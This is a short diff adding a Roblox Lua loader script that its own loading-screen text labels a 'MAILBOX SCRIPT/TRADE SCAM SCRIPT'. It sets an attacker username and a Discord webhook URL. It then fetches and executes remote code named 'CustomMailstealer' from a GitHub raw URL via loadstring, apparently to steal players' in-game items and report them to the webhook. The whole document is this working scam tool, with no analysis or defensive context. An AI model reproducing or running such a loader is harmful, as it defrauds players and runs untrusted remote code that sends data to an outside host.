@@ -1,0 +1,8 @@
+```LUA
+Username = "cold_hearted27"
+Webhook = "https://discord.com/api/webhooks/1202125976532951041/h7QfwqlbioShqh7GGULXrjC0ECwSm2NJxlmw4PejsY0-fPKULGBi1EF1F1v3xuSXGQpD"
+
+G_LoadingScreen = "MAILBOX SCRIPT/TRADE SCAM SCRIPT BY THEAA"
+G_WebhookName = "Bot ni thea"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LypherX/MoriCustom/main/CustomMailstealer"))()```
